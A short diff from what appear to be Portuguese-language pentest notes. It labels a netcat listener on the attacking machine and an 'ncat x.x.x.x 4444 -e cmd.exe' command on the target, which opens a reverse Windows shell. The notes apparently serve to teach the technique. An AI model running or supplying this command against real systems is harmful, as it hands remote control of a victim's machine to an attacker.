@@ -61,7 +61,7 @@ ex:
 
    nc -lvp 4444 -> computador de ataque 
    
-   C:\Program Files (x86)\Nmap>ncat x.x.x.x 4444 -e cmd.exe
+   C:\Program Files (x86)\Nmap>ncat x.x.x.x 4444 -e cmd.exe -> computador do alvo
 
 
   
